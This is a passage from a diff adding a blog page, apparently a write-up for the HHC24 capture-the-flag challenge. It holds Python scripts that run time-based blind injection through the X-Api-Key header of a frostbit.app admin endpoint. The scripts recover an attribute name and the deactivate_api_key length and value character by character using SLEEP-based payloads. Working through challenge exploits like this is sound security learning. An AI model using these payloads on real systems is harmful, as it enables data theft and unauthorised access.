+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Function to guess the full name of Attribute 0</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">guess_attribute_name</span>(attribute_length):
+</span></span><span style="display:flex;"><span>    guessed_name <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> i <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(attribute_length):  <span style="color:#78787e"># Loop for the known length of the attribute</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> character <span style="color:#ff6ac1">in</span> string<span style="color:#ff6ac1">.</span>ascii_letters <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;_&#34;</span> <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;!&#34;</span>:  <span style="color:#78787e"># Test a-z, A-Z, 0-9, and _!</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#78787e">#time.sleep(2)  # Small delay to avoid overwhelming the server</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> test_character(guessed_name, character):
+</span></span><span style="display:flex;"><span>                guessed_name <span style="color:#ff6ac1">+=</span> character
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">break</span>  <span style="color:#78787e"># Move to the next position once the correct character is found</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> guessed_name
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Main function</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;Starting to guess the name of Attribute 0 using LIKE...</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    attribute_length <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">18</span>  <span style="color:#78787e"># Length of Attribute 0</span>
+</span></span><span style="display:flex;"><span>    attribute_name <span style="color:#ff6ac1">=</span> guess_attribute_name(attribute_length)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">Guessed name for Attribute 0: </span><span style="color:#5af78e">{</span>attribute_name<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span></code></pre></div><h3 id="guessing-length-of-value-for-attribute-deactivate_api_key">
+  Guessing length of value for <em><strong>attribute deactivate_api_key</strong></em>
+  <a class="heading-link" href="#guessing-length-of-value-for-attribute-deactivate_api_key">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Define the target URL and headers</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true&#39;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#ff6ac1">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#39;Host&#39;</span>: <span style="color:#5af78e">&#39;api.frostbit.app&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#39;X-Api-Key&#39;</span>: <span style="color:#5af78e">&#34;&#34;</span>  <span style="color:#78787e"># Placeholder for the payload</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Function to test the length of the &#39;deactivate_api_key&#39; value</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">test_value_length</span>(value_length):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Testing length of value for &#39;deactivate_api_key&#39;: </span><span style="color:#5af78e">{</span>value_length<span style="color:#5af78e">}</span><span style="color:#5af78e">...&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#78787e"># Construct the payload to check the length of the value</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;&#39; OR LENGTH(doc.deactivate_api_key) == </span><span style="color:#5af78e">{</span>value_length<span style="color:#5af78e">}</span><span style="color:#5af78e"> ? SLEEP(2) : &#39;a&#34;</span>
+</span></span><span style="display:flex;"><span>    headers[<span style="color:#5af78e">&#39;X-Api-Key&#39;</span>] <span style="color:#ff6ac1">=</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    start_time <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time()  <span style="color:#78787e"># Record the start time of the request</span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>get(url, headers<span style="color:#ff6ac1">=</span>headers)
+</span></span><span style="display:flex;"><span>    elapsed_time <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time() <span style="color:#ff6ac1">-</span> start_time  <span style="color:#78787e"># Calculate response time</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> elapsed_time <span style="color:#ff6ac1">&gt;=</span> <span style="color:#ff9f43">2</span>:  <span style="color:#78787e"># If response is delayed by 2 seconds, it means the length is correct</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Found value length: </span><span style="color:#5af78e">{</span>value_length<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Function to determine the length of &#39;deactivate_api_key&#39; value</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">find_value_length</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> length <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(<span style="color:#ff9f43">1</span>, <span style="color:#ff9f43">40</span>):  <span style="color:#78787e"># Test lengths from 1 to 40 (adjust range as needed)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">if</span> test_value_length(length):
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">return</span> length
+</span></span><span style="display:flex;"><span>        time<span style="color:#ff6ac1">.</span>sleep(<span style="color:#ff9f43">0.5</span>)  <span style="color:#78787e"># Small delay to avoid overwhelming the server</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">None</span>  <span style="color:#78787e"># If length is not found in the specified range</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Main function</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;Starting to find the length of &#39;deactivate_api_key&#39; value...</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    value_length <span style="color:#ff6ac1">=</span> find_value_length()  <span style="color:#78787e"># Find the length of the value for &#39;deactivate_api_key&#39;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> value_length:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">Length of &#39;deactivate_api_key&#39; value: </span><span style="color:#5af78e">{</span>value_length<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">else</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">Failed to determine the length of the &#39;deactivate_api_key&#39; value.&#34;</span>)
+</span></span></code></pre></div><h3 id="guessing-value-of-attribute-deactivate_api_key">
+  Guessing value of attribute <em><strong>deactivate_api_key</strong></em>
+  <a class="heading-link" href="#guessing-value-of-attribute-deactivate_api_key">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> time
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">import</span> string
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Define the target URL and headers</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#39;https://api.frostbit.app/api/v1/frostbitadmin/bot/83270120-3b1c-41f3-b25b-deaa5b5d1327/deactivate?debug=true&#39;</span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#ff6ac1">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#39;Host&#39;</span>: <span style="color:#5af78e">&#39;api.frostbit.app&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#5af78e">&#39;X-Api-Key&#39;</span>: <span style="color:#5af78e">&#34;&#34;</span>  <span style="color:#78787e"># Placeholder for the payload</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Function to test a single character of the &#39;deactivate_api_key&#39; value</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">test_character</span>(guessed_name, character):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Testing character &#39;</span><span style="color:#5af78e">{</span>character<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39; for guessed name: &#39;</span><span style="color:#5af78e">{</span>guessed_name<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39;...&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pattern <span style="color:#ff6ac1">=</span> guessed_name <span style="color:#ff6ac1">+</span> character <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;%&#34;</span>  <span style="color:#78787e"># Create the pattern</span>
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;&#39; OR doc.deactivate_api_key LIKE &#39;</span><span style="color:#5af78e">{</span>pattern<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39; ? SLEEP(2) : &#39;a&#34;</span>
+</span></span><span style="display:flex;"><span>    headers[<span style="color:#5af78e">&#39;X-Api-Key&#39;</span>] <span style="color:#ff6ac1">=</span> payload
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    start_time <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time()  <span style="color:#78787e"># Record the start time of the request</span>
+</span></span><span style="display:flex;"><span>    response <span style="color:#ff6ac1">=</span> requests<span style="color:#ff6ac1">.</span>get(url, headers<span style="color:#ff6ac1">=</span>headers)
+</span></span><span style="display:flex;"><span>    elapsed_time <span style="color:#ff6ac1">=</span> time<span style="color:#ff6ac1">.</span>time() <span style="color:#ff6ac1">-</span> start_time  <span style="color:#78787e"># Calculate response time</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">if</span> elapsed_time <span style="color:#ff6ac1">&gt;=</span> <span style="color:#ff9f43">2</span>:  <span style="color:#78787e"># If response is delayed by 2 seconds, it means the character is correct</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;Found character &#39;</span><span style="color:#5af78e">{</span>character<span style="color:#5af78e">}</span><span style="color:#5af78e">&#39;!&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> <span style="color:#ff6ac1">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Function to guess the full value of &#39;deactivate_api_key&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">def</span> <span style="color:#57c7ff">guess_value</span>(value_length):
+</span></span><span style="display:flex;"><span>    guessed_value <span style="color:#ff6ac1">=</span> <span style="color:#5af78e">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">for</span> i <span style="color:#ff6ac1">in</span> <span style="color:#ff5c57">range</span>(value_length):  <span style="color:#78787e"># Loop for the known length of the value</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff6ac1">for</span> character <span style="color:#ff6ac1">in</span> string<span style="color:#ff6ac1">.</span>ascii_lowercase <span style="color:#ff6ac1">+</span> string<span style="color:#ff6ac1">.</span>digits <span style="color:#ff6ac1">+</span> <span style="color:#5af78e">&#34;-._&#34;</span>:  <span style="color:#78787e"># Test possible characters</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff6ac1">if</span> test_character(guessed_value, character):
+</span></span><span style="display:flex;"><span>                guessed_value <span style="color:#ff6ac1">+=</span> character
+</span></span><span style="display:flex;"><span>                <span style="color:#ff6ac1">break</span>  <span style="color:#78787e"># Move to the next position once the correct character is found</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#78787e">#time.sleep(0.5)  # Small delay to avoid overwhelming the server</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff6ac1">return</span> guessed_value
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># Main function</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">if</span> __name__ <span style="color:#ff6ac1">==</span> <span style="color:#5af78e">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">&#34;Starting to guess the value of &#39;deactivate_api_key&#39;...</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">&#34;</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    value_length <span style="color:#ff6ac1">=</span> <span style="color:#ff9f43">36</span>  <span style="color:#78787e"># Length of &#39;deactivate_api_key&#39; value</span>
+</span></span><span style="display:flex;"><span>    guessed_value <span style="color:#ff6ac1">=</span> guess_value(value_length)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff5c57">print</span>(<span style="color:#5af78e">f</span><span style="color:#5af78e">&#34;</span><span style="color:#5af78e">\n</span><span style="color:#5af78e">Guessed value for &#39;deactivate_api_key&#39;: </span><span style="color:#5af78e">{</span>guessed_value<span style="color:#5af78e">}</span><span style="color:#5af78e">&#34;</span>)
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3 id="see-also-in-hhc24">
+        See also in HHC24
+        <a class="heading-link" href="#see-also-in-hhc24">
+          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+          <span class="sr-only">Link to heading</span>
+        </a>
+      </h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/elfstack/">HHC24 - ElfStack</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/santavision/">HHC24 - SantaVision</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/dronmagedon/">HHC24 - Dronmagedon</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/powershell/">HHC24 - Powershell</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/blog/posts/hhc24/snowball-showdown/">HHC24 - Snowball-Showdown</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2025
+     ArmBraker 👨‍💻 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/blog/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
